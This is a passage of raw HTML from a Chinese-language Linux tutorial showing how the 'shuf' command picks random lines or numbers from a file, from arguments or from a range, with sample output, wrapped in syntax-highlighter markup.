class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f83571984318-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f83571984318-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f83571984318-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f83571984318-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f83571984318-2\"><span class=\"crayon-i\">line6</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f83571984318-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>同样，我们可以选择前 “n” 个随机条目。以下命令将只显示前五个随机条目：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f86215421452\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -n 5 ostechnix.txt\r\nline10\r\nline4\r\nline5\r\nline9\r\nline3\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f86215421452-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f86215421452-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f86215421452-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f86215421452-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f86215421452-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f86215421452-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f86215421452-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f86215421452-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f86215421452-2\"><span class=\"crayon-e\">line10</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f86215421452-3\"><span class=\"crayon-e\">line4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f86215421452-4\"><span class=\"crayon-e\">line5</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f86215421452-5\"><span class=\"crayon-e\">line9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f86215421452-6\"><span class=\"crayon-i\">line3</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f86215421452-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>如下所示，我们可以直接使用 <code>-e</code> 标志传入输入，而不是从文件中读取行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f89848934049\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -e line1 line2 line3 line4 line5\r\nline1\r\nline3\r\nline5\r\nline4\r\nline2\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f89848934049-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f89848934049-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f89848934049-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f89848934049-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f89848934049-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f89848934049-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f89848934049-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f89848934049-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">line1 </span><span class=\"crayon-e\">line2 </span><span class=\"crayon-e\">line3 </span><span class=\"crayon-e\">line4 </span><span class=\"crayon-e\">line5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f89848934049-2\"><span class=\"crayon-e\">line1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f89848934049-3\"><span class=\"crayon-e\">line3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f89848934049-4\"><span class=\"crayon-e\">line5</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f89848934049-5\"><span class=\"crayon-e\">line4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f89848934049-6\"><span class=\"crayon-i\">line2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f89848934049-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你也可以传入数字：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f8c734167894\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -e 1 2 3 4 5\r\n3\r\n5\r\n1\r\n4\r\n2\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f8c734167894-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f8c734167894-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f8c734167894-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f8c734167894-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f8c734167894-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f8c734167894-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f8c734167894-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f8c734167894-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f8c734167894-2\"><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f8c734167894-3\"><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f8c734167894-4\"><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f8c734167894-5\"><span class=\"crayon-cn\">4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f8c734167894-6\"><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f8c734167894-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>要快速在给定范围选择一个，请改用此命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f8f031521160\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -n 1 -e 1 2 3 4 5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f8f031521160-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f8f031521160-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f8f031521160-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f8f031521160-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>或者，选择下面的任意三个随机数字：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f92312923981\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -n 3 -e 1 2 3 4 5\r\n3\r\n5\r\n1\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f92312923981-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f92312923981-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f92312923981-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f92312923981-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f92312923981-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f92312923981-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f92312923981-2\"><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f92312923981-3\"><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f92312923981-4\"><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f92312923981-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>我们也可以在特定范围内生成随机数。例如，要显示 1 到 10 之间的随机数，只需使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f96371836383\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ shuf -i 1-10\r\n1\r\n9\r\n8\r\n2\r\n4\r\n7\r\n6\r\n3\r\n10\r\n5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f96371836383-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f96371836383-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f96371836383-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f96371836383-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f96371836383-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f96371836383-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f96371836383-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f96371836383-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f96371836383-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f96371836383-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930c4f96371836383-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930c4f96371836383-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f96371836383-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">shuf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f96371836383-2\"><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f96371836383-3\"><span class=\"crayon-cn\">9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f96371836383-4\"><span class=\"crayon-cn\">8</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f96371836383-5\"><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f96371836383-6\"><span class=\"crayon-cn\">4</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f96371836383-7\"><span class=\"crayon-cn\">7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f96371836383-8\"><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f96371836383-9\"><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f96371836383-10\"><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930c4f96371836383-11\"><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930c4f96371836383-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>有关更多详细信息，请参阅手册页。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930c4f99815994721\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div 